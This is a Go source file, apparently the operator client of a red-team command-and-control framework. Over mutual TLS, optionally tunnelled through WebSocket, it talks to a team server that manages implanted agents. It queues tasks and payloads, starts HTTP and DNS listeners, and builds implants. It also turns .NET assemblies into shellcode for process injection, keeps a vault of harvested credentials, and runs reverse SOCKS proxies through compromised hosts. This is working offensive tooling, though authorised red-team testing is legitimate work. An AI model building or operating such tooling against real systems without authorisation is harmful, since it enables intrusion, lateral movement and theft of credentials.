package client

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"redteam/profile"
	"redteam/server"
)

// wsNetConn wraps a *websocket.Conn as a net.Conn so that the mTLS layer can
// perform its handshake over a WebSocket transport channel.
type wsNetConn struct {
	ws  *websocket.Conn
	buf []byte     // unconsumed bytes from last ReadMessage
	mu  sync.Mutex // gorilla requires exclusive writer
}

func (c *wsNetConn) Read(b []byte) (int, error) {
	// Drain any leftover bytes from the previous frame first
	if len(c.buf) > 0 {
		n := copy(b, c.buf)
		c.buf = c.buf[n:]
		return n, nil
	}
	_, msg, err := c.ws.ReadMessage()
	if err != nil {
		return 0, err
	}
	n := copy(b, msg)
	if n < len(msg) {
		c.buf = append(c.buf, msg[n:]...)
	}
	return n, nil
}

func (c *wsNetConn) Write(b []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if err := c.ws.WriteMessage(websocket.BinaryMessage, b); err != nil {
		return 0, err
	}
	return len(b), nil
}

func (c *wsNetConn) Close() error                       { return c.ws.Close() }
func (c *wsNetConn) LocalAddr() net.Addr                { return c.ws.LocalAddr() }
func (c *wsNetConn) RemoteAddr() net.Addr               { return c.ws.RemoteAddr() }
func (c *wsNetConn) SetReadDeadline(t time.Time) error  { return c.ws.SetReadDeadline(t) }
func (c *wsNetConn) SetWriteDeadline(t time.Time) error { return c.ws.SetWriteDeadline(t) }
func (c *wsNetConn) SetDeadline(t time.Time) error {
	if err := c.ws.SetReadDeadline(t); err != nil {
		return err
	}
	return c.ws.SetWriteDeadline(t)
}

type Client struct {
	base   string // https://host:port
	http   *http.Client
}

type apiResp struct {
	OK    bool            `json:"ok"`
	Data  json.RawMessage `json:"data"`
	Error string          `json:"error"`
}

func New(p *profile.Profile) (*Client, error) {
	cert, err := tls.X509KeyPair([]byte(p.ClientCertPEM), []byte(p.ClientKeyPEM))
	if err != nil {
		return nil, fmt.Errorf("keypair: %w", err)
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM([]byte(p.CACertPEM)) {
		return nil, fmt.Errorf("CA cert inválido")
	}
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	}

	var transport http.RoundTripper
	if p.ViaWS != "" {
		// WebSocket tunnel mode: dial WS URL, wrap as net.Conn, do inner mTLS.
		// Outer TLS (if wss://) is handled by gorilla; inner mTLS is ours.
		wsURL := p.ViaWS
		d := &websocket.Dialer{HandshakeTimeout: 15 * time.Second}
		transport = &http.Transport{
			DialTLSContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
				wsConn, _, err := d.DialContext(ctx, wsURL, nil)
				if err != nil {
					return nil, fmt.Errorf("ws dial %s: %w", wsURL, err)
				}
				wrapped := &wsNetConn{ws: wsConn}
				tlsConn := tls.Client(wrapped, tlsCfg)
				if err := tlsConn.HandshakeContext(ctx); err != nil {
					wsConn.Close()
					return nil, fmt.Errorf("mTLS over WS: %w", err)
				}
				return tlsConn, nil
			},
		}
	} else {
		transport = &http.Transport{TLSClientConfig: tlsCfg}
	}

	return &Client{
		base: "https://" + p.Server,
		http: &http.Client{Transport: transport, Timeout: 30 * time.Second},
	}, nil
}

func (c *Client) Ping() error {
	var resp map[string]string
	return c.get("/api/ping", &resp)
}

func (c *Client) ChatSince(sinceID int64) (json.RawMessage, error) {
	var raw json.RawMessage
	return raw, c.get(fmt.Sprintf("/api/chat?since=%d", sinceID), &raw)
}

func (c *Client) ChatPost(text string) error {
	return c.post("/api/chat", map[string]string{"text": text}, nil)
}

func (c *Client) Operators() ([]string, error) {
	var ops []string
	return ops, c.get("/api/operators", &ops)
}

func (c *Client) Agents() (json.RawMessage, error) {
	var raw json.RawMessage
	return raw, c.get("/api/agents", &raw)
}

func (c *Client) AgentInfo(id string) (json.RawMessage, error) {
	var raw json.RawMessage
	return raw, c.get("/api/agents/"+id, &raw)
}

func (c *Client) QueueTask(agentID, taskType, args string, payload []byte) (int64, error) {
	body := map[string]any{"type": taskType, "args": args, "payload": payload}
	var resp struct {
		TaskID int64 `json:"task_id"`
	}
	if err := c.post("/api/agents/"+agentID+"/task", body, &resp); err != nil {
		return 0, err
	}
	return resp.TaskID, nil
}

func (c *Client) Results(agentID string, limit int) (json.RawMessage, error) {
	var raw json.RawMessage
	url := fmt.Sprintf("/api/agents/%s/results?limit=%d", agentID, limit)
	return raw, c.get(url, &raw)
}

func (c *Client) TaskResult(agentID string, taskID int64) (*server.Result, error) {
	var r server.Result
	url := fmt.Sprintf("/api/agents/%s/results/%d", agentID, taskID)
	return &r, c.get(url, &r)
}

func (c *Client) WaitResult(agentID string, taskID int64, timeout time.Duration) (*server.Result, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		r, err := c.TaskResult(agentID, taskID)
		if err == nil {
			return r, nil
		}
		time.Sleep(2 * time.Second)
	}
	return nil, fmt.Errorf("timeout waiting for task #%d result", taskID)
}

func (c *Client) KillAgent(agentID string) error {
	return c.post("/api/agents/"+agentID+"/kill", nil, nil)
}

func (c *Client) DeleteAgent(agentID string) error {
	return c.delete("/api/agents/" + agentID + "/delete")
}

func (c *Client) Jobs() (json.RawMessage, error) {
	var raw json.RawMessage
	return raw, c.get("/api/jobs", &raw)
}

func (c *Client) StartListener(proto string, port int) (int, error) {
	body := map[string]any{"proto": proto, "port": port}
	var resp struct {
		JobID int `json:"job_id"`
	}
	if err := c.post("/api/jobs", body, &resp); err != nil {
		return 0, err
	}
	return resp.JobID, nil
}

func (c *Client) StopListener(jobID int) error {
	return c.delete(fmt.Sprintf("/api/jobs/%d", jobID))
}

func (c *Client) Build(cfg map[string]any) (map[string]string, error) {
	var resp map[string]string
	return resp, c.post("/api/build", cfg, &resp)
}

// Donut converts a .NET assembly binary to raw shellcode using the server-side
// go-donut converter. Returns shellcode bytes ready for FORK_RUN / INJECT_APC.
func (c *Client) Donut(data []byte) ([]byte, error) {
	req, err := http.NewRequest(http.MethodPost, c.base+"/api/donut", bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	resp, err := c.http.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("donut: %s", b)
	}
	return io.ReadAll(resp.Body)
}

func (c *Client) GenCert(label string) (map[string]string, error) {
	var resp map[string]string
	return resp, c.post("/api/gencert", map[string]string{"label": label}, &resp)
}

func (c *Client) GetReport() (*json.RawMessage, error) {
	var raw json.RawMessage
	return &raw, c.get("/api/report", &raw)
}

// ── credential vault ──────────────────────────────────────────────────────

func (c *Client) ListCreds(filter string) (json.RawMessage, error) {
	var raw json.RawMessage
	path := "/api/creds"
	if filter != "" {
		path += "?q=" + filter
	}
	return raw, c.get(path, &raw)
}

func (c *Client) AddCred(credType, domain, username, secret, host, source string) (json.RawMessage, error) {
	var raw json.RawMessage
	body := map[string]string{
		"type":     credType,
		"domain":   domain,
		"username": username,
		"secret":   secret,
		"host":     host,
		"source":   source,
	}
	return raw, c.post("/api/creds", body, &raw)
}

func (c *Client) DeleteCred(id int64) error {
	return c.delete(fmt.Sprintf("/api/creds/%d", id))
}

// ── operator roles ────────────────────────────────────────────────────────

func (c *Client) ListRoles() (json.RawMessage, error) {
	var raw json.RawMessage
	return raw, c.get("/api/roles", &raw)
}

func (c *Client) SetRole(operator, role string) error {
	return c.post("/api/roles", map[string]string{"operator": operator, "role": role}, nil)
}

// ── DNS listener ──────────────────────────────────────────────────────────

func (c *Client) ListUploads() (json.RawMessage, error) {
	var raw json.RawMessage
	return raw, c.get("/api/uploads", &raw)
}

func (c *Client) ListTargets() (json.RawMessage, error) {
	var raw json.RawMessage
	return raw, c.get("/api/targets", &raw)
}

func (c *Client) StartDNSListener(domain string, port int) (int, error) {
	body := map[string]any{"proto": "dns", "port": port, "domain": domain}
	var resp struct {
		JobID int `json:"job_id"`
	}
	if err := c.post("/api/jobs", body, &resp); err != nil {
		return 0, err
	}
	return resp.JobID, nil
}

func (c *Client) StartRSocks(agentID string, socksPort int, user, pass string) (map[string]interface{}, error) {
	var resp map[string]interface{}
	body := map[string]any{"agent_id": agentID, "socks_port": socksPort}
	if user != "" {
		body["user"] = user
		body["pass"] = pass
	}
	if err := c.post("/api/rsocks", body, &resp); err != nil {
		return nil, err
	}
	return resp, nil
}

func (c *Client) StopRSocks(agentID string) error {
	return c.deleteBody("/api/rsocks", map[string]any{"agent_id": agentID})
}

// ── HTTP helpers ──────────────────────────────────────────────────────────

func (c *Client) get(path string, out any) error {
	resp, err := c.http.Get(c.base + path)
	if err != nil {
		return err
	}
	return c.decode(resp, out)
}

func (c *Client) post(path string, body any, out any) error {
	var buf bytes.Buffer
	if body != nil {
		json.NewEncoder(&buf).Encode(body)
	}
	resp, err := c.http.Post(c.base+path, "application/json", &buf)
	if err != nil {
		return err
	}
	return c.decode(resp, out)
}

func (c *Client) delete(path string) error {
	req, err := http.NewRequest(http.MethodDelete, c.base+path, nil)
	if err != nil {
		return err
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return err
	}
	return c.decode(resp, nil)
}

func (c *Client) deleteBody(path string, body any) error {
	var buf bytes.Buffer
	if body != nil {
		json.NewEncoder(&buf).Encode(body)
	}
	req, err := http.NewRequest(http.MethodDelete, c.base+path, &buf)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.http.Do(req)
	if err != nil {
		return err
	}
	return c.decode(resp, nil)
}

func (c *Client) decode(resp *http.Response, out any) error {
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	var ar apiResp
	if err := json.Unmarshal(body, &ar); err != nil {
		return fmt.Errorf("respuesta no JSON (status %d): %s", resp.StatusCode, body)
	}
	if !ar.OK {
		return fmt.Errorf("servidor: %s", ar.Error)
	}
	if out != nil && ar.Data != nil {
		return json.Unmarshal(ar.Data, out)
	}
	return nil
}
